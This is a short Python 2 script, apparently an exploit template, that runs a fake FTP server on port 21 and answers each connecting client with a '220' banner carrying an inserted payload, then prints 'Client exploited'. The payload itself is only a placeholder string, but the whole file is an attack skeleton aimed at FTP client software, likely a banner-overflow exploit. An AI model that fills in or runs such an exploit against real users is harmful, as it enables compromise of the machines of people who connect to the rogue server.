#!/usr/bin/python

from socket import *

payload = "Here we will insert the payload"

s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 "+payload+"\r\n")
c.recv(1024)
c.close()
print "[+] Client exploited !! quitting"
s.close()
